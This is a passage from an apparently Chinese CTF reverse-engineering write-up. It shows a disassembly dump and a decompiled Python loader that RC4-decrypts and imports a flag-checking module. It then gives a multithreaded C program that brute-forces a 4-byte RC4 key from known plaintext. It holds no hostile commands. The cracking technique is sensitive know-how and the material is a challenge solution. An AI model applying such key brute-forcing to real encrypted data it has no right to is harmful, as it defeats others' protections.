61h ; a</span><br><span class="line">.rdata:0000000180008288                 db  2Bh ; +</span><br><span class="line">.rdata:0000000180008289                 db  30h ; <span class="number">0</span></span><br><span class="line">.rdata:000000018000828A                 db 0B5h</span><br><span class="line">.rdata:000000018000828B                 db  1Bh</span><br><span class="line">.rdata:000000018000828C                 db 0BDh</span><br><span class="line">.rdata:000000018000828D                 db  0Ch</span><br><span class="line">.rdata:000000018000828E                 db  6Bh ; k</span><br><span class="line">.rdata:000000018000828F                 db  6Fh ; o</span><br><span class="line">.rdata:0000000180008290                 db  81h</span><br><span class="line">.rdata:0000000180008291                 db  61h ; a</span><br><span class="line">.rdata:0000000180008292                 db  6Eh ; n</span><br><span class="line">.rdata:0000000180008293                 db  67h ; g</span><br><span class="line">.rdata:0000000180008294                 db  64h ; d</span><br><span class="line">.rdata:0000000180008295                 db  72h ; r</span><br><span class="line">.rdata:0000000180008296                 db  65h ; e</span><br><span class="line">.rdata:0000000180008297                 db  61h ; a</span><br><span class="line">.rdata:0000000180008298                 db  6Dh ; m</span><br><span class="line">.rdata:0000000180008299                 db  69h ; i</span><br><span class="line">.rdata:000000018000829A                 db  74h ; t</span><br><span class="line">.rdata:000000018000829B                 db  73h ; s</span><br><span class="line">.rdata:000000018000829C                 db  6Dh ; m</span><br><span class="line">.rdata:000000018000829D                 db  71h ; q</span><br><span class="line">.rdata:000000018000829E                 db  67h ; g</span><br><span class="line">.rdata:000000018000829F                 db  6Fh ; o</span><br><span class="line">.rdata:00000001800082A0                 db  62h ; b</span><br><span class="line">.rdata:00000001800082A1                 db  61h ; a</span><br><span class="line">.rdata:00000001800082A2                 db  6Eh ; n</span><br><span class="line">.rdata:00000001800082A3                 db  67h ; g</span><br><span class="line">.rdata:00000001800082A4                 db  64h ; d</span><br></pre></td></tr></table></figure>

<style>.xykatkcxabxe{zoom:80%;}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137193-2.png" class="xykatkcxabxe" alt="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: layer2.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.12.0rc2 (3531)</span></span><br><span class="line"><span class="comment"># Source timestamp: 2025-09-10 10:56:06 UTC (1757501766)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> wintypes</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BUF</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [(<span class="string">&#x27;Length&#x27;</span>, wintypes.ULONG), (<span class="string">&#x27;Unused&#x27;</span>, wintypes.ULONG), (<span class="string">&#x27;Ptr&#x27;</span>, ctypes.c_void_p)]</span><br><span class="line">key = <span class="built_in">input</span>(<span class="string">&#x27;Input your key: &#x27;</span>)</span><br><span class="line">tmp = <span class="number">2166136261</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">    tmp = <span class="number">16777619</span> * (tmp ^ <span class="built_in">ord</span>(ch)) &amp; <span class="number">4294967295</span></span><br><span class="line">key_bytes = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, tmp)</span><br><span class="line">advapi32 = ctypes.WinDLL(<span class="string">&#x27;advapi32&#x27;</span>, use_last_error=<span class="literal">True</span>)</span><br><span class="line">SystemFunction033 = advapi32.SystemFunction033</span><br><span class="line">FNPROTO = ctypes.WINFUNCTYPE(<span class="literal">None</span>, ctypes.POINTER(BUF), ctypes.POINTER(BUF))</span><br><span class="line">fn = FNPROTO(ctypes.cast(SystemFunction033, ctypes.c_void_p).value)</span><br><span class="line">data = <span class="string">b&#x27;\xb7\xc3\xbc\xe5 &lt;skip&gt;&#x27;</span></span><br><span class="line">data_buffer = ctypes.create_string_buffer(data)</span><br><span class="line">key_buffer = ctypes.create_string_buffer(key_bytes)</span><br><span class="line">data_buf = BUF(<span class="built_in">len</span>(data), <span class="number">0</span>, ctypes.addressof(data_buffer))</span><br><span class="line">key_buf = BUF(<span class="number">4</span>, <span class="number">0</span>, ctypes.addressof(key_buffer))</span><br><span class="line">fn(ctypes.byref(data_buf), ctypes.byref(key_buf))</span><br><span class="line">pyd_path = os.path.join(os.getcwd(), <span class="string">&#x27;checkinput.pyd&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(pyd_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data_buffer.raw[:<span class="built_in">len</span>(data)])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    spec = importlib.util.spec_from_file_location(<span class="string">&#x27;checkinput&#x27;</span>, pyd_path)</span><br><span class="line">    module = importlib.util.module_from_spec(spec)</span><br><span class="line">    spec.loader.exec_module(module)</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;Input your flag: &#x27;</span>)</span><br><span class="line">    result = module.check(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Right!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Wrong key!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关于key的运算，可以看到魔数2166136261与16777619，可以判断是FNV哈希算法，然后哈希值被打包成4字节的小端字节序格式（<code>key_bytes</code>），用作RC4解密的密钥。将解密后的数据放入当前目录下的<code>checkinput.pyd</code>文件中，使用<code>importlib</code>动态导入该模块，并获取其中的<code>check</code>函数。用户被提示输入flag，并调用<code>module.check</code>进行验证。</p>
<p>所以接下来需要求得RC4的密钥</p>
<p>已知:</p>
<ul>
<li>密文前四个字节：<code>\xb7\xc3\xbc\xe5</code>   明文前四个：<code>4D 5A 90 00</code></li>
<li>密钥长度为 4 字节</li>
</ul>
<p>rc4短密钥爆破脚本：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    MistHill, created on 10:24:34 2013-7-3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    compile:</span></span><br><span class="line"><span class="comment">        Visual Studio 6:</span></span><br><span class="line"><span class="comment">            CL /Og /Os /Oy /Ob1 /GT /Gs /Gf /Gy /G6 /MT rc4KStream75MT.c /link /RELEASE</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Refs:</span></span><br><span class="line"><span class="comment">    1) Optimizing C++/Code optimization/Faster operations</span></span><br><span class="line"><span class="comment">        http://en.wikibooks.org/wiki/Optimizing_C%2B%2B/Code_optimization/Faster_operations</span></span><br><span class="line"><span class="comment">    2) Writing Efficient C and C Code Optimization</span></span><br><span class="line"><span class="comment">        http://www.codeproject.com/Articles/6154/Writing-Efficient-C-and-C-Code-Optimization</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    3) Multithreading Tutorial #1</span></span><br><span class="line"><span class="comment">        http://www.computersciencelab.com/MultithreadingTut1.htm</span></span><br><span class="line"><span class="comment">    4) Walkthrough: Debugging a Multithreaded Application</span></span><br><span class="line"><span class="comment">        http://msdn.microsoft.com/en-us/library/bb157784(v=vs.90).aspx</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGETKS1 0xe52c99fa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare_key</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key_data_ptr, <span class="type">int</span> key_data_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">GetKeyStream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buffer_ptr, <span class="type">int</span> buffer_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> _Recursion(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT1(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT2(<span class="type">void</span>*);</span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT3(<span class="type">void</span>*);</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Recursion</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">char</span> *pKey, <span class="type">unsigned</span> <span class="type">char</span> *pKeyStream, <span class="type">unsigned</span> <span class="type">char</span> *pstate)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ConsoleHandler</span><span class="params">(DWORD dwCtrlType)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowExecutionTime</span><span class="params">(BOOL bBreaked)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowMatchedKeystream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//static int TargetKS1 = 0x62383550, TargetKS2 = 0x6F0C1E2C; /* Target KS = 50 35 38 62 2C 1E 0C 6F */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KeyLength 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szErrMsgCT[] =<span class="string">&quot;Create thread%d failed!\n&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szFmtHex2[] =<span class="string">&quot;%02X &quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> szFmtDate[] =<span class="string">&quot;\n%s\t%04d-%02d-%02d %02d:%02d:%02d.%03d&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> stateinit[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> Key[<span class="number">8</span>], KeyT1[<span class="number">8</span>], KeyT2[<span class="number">8</span>], KeyT3[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Size: just 4 is fine. Exec. time of function GetKeyStream() reduced!</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> KeyStream[<span class="number">4</span>], KeyStreamT1[<span class="number">4</span>], KeyStreamT2[<span class="number">4</span>], KeyStreamT3[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">256</span>], stateT1[<span class="number">256</span>], stateT2[<span class="number">256</span>], stateT3[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> SYSTEMTIME lt0, lt1;</span><br><span class="line"><span class="type">static</span> DWORD dw0, dw1;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    HANDLE hThread[<span class="number">3</span>];</span><br><span class="line">    <span class="type">unsigned</span> threadID[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SetConsoleCtrlHandler</span>( (PHANDLER_ROUTINE)ConsoleHandler, TRUE)==FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to install handler!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetLocalTime</span>(&amp;lt0);</span><br><span class="line">    dw0 = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span>; i &lt;<span class="number">256</span>; i++)</span><br><span class="line">        stateinit[i] = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create the threads.</span></span><br><span class="line">    hThread[<span class="number">0</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT1,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">0</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">1</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT2,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">2</span>] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>, &amp;_RecursionT3,<span class="literal">NULL</span>,<span class="number">0</span>, &amp;threadID[<span class="number">2</span>] );</span><br><span class="line">    <span class="keyword">if</span>(!hThread[<span class="number">2</span>]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(szErrMsgCT,<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _Recursion(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForMultipleObjects</span>(<span class="number">3</span>, hThread, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ShowExecutionTime</span>(FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> _Recursion(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x30~0x7A: T0(0x30~0x42), T1(0x43~0x55), T2(0x56~0x68), T3(0x69~0x7A)</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++) &#123;</span><br><span class="line">        Key[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, Key, KeyStream, state);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT1(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">64</span>;i&lt;<span class="number">128</span>;i++) &#123;</span><br><span class="line">        KeyT1[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT1, KeyStreamT1, stateT1);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT2(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">128</span>;i&lt;<span class="number">192</span>;i++) &#123;</span><br><span class="line">        KeyT2[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT2, KeyStreamT2, stateT2);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __stdcall _RecursionT3(<span class="type">void</span>* pArguments)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">192</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        KeyT3[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="built_in">Recursion</span>(<span class="number">1</span>, KeyT3, KeyStreamT3, stateT3);</span><br><span class="line">    &#125;</span><br><span class="line">    _endthreadex(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Recursion</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">char</span> *pKey, <span class="type">unsigned</span> <span class="type">char</span> *pKeyStream, <span class="type">unsigned</span> <span class="type">char</span> *pstate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        pKey[idx] = i;</span><br><span class="line">        <span class="keyword">if</span>(idx <span class="number">+1</span> &lt; KeyLength)</span><br><span class="line">            <span class="built_in">Recursion</span>(idx <span class="number">+1</span>, pKey, pKeyStream, pstate);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(pstate, stateinit,<span class="built_in">sizeof</span>(stateinit));</span><br><span class="line">            <span class="built_in">prepare_key</span>(pKey, KeyLength, pstate);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( <span class="built_in">GetKeyStream</span>(pKeyStream,<span class="built_in">sizeof</span>(KeyStream), pstate) )</span><br><span class="line">                <span class="built_in">ShowMatchedKeystream</span>(pKey);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare_key</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key_data_ptr, <span class="type">int</span> key_data_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> swapByte;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> index1, index2;</span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line"></span><br><span class="line">    index1 = index2 =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(counter =<span class="number">0</span>; counter &lt;<span class="number">256</span>; counter++)</span><br><span class="line">    &#123;</span><br><span class="line">        index2 = key_data_ptr[index1] + state[counter] + index2;</span><br><span class="line"></span><br><span class="line">        swapByte = state[counter];</span><br><span class="line">        state[counter] = state[index2];</span><br><span class="line">        state[index2] = swapByte;</span><br><span class="line"></span><br><span class="line">        index1++;</span><br><span class="line">        <span class="keyword">while</span>(index1 == key_data_len)</span><br><span class="line">            index1 -= key_data_len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetKeyStream</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buffer_ptr, <span class="type">int</span> buffer_len, <span class="type">unsigned</span> <span class="type">char</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> swapByte;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> x;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> y;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> xorIndex;</span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line"></span><br><span class="line">    x = y =<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(counter =<span class="number">0</span>; counter &lt; buffer_len; counter ++)</span><br><span class="line">    &#123;</span><br><span class="line">        x++;</span><br><span class="line">        y = state[x] + y;</span><br><span class="line"></span><br><span class="line">        swapByte = state[x];</span><br><span class="line">        state[x] = state[y];</span><br><span class="line">        state[y] = swapByte;</span><br><span class="line"></span><br><span class="line">        xorIndex = state[x] + state[y];</span><br><span class="line"></span><br><span class="line">        buffer_ptr[counter] = state[xorIndex];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( *(<span class="type">int</span>*)buffer_ptr == TARGETKS1 )</span><br><span class="line">        <span 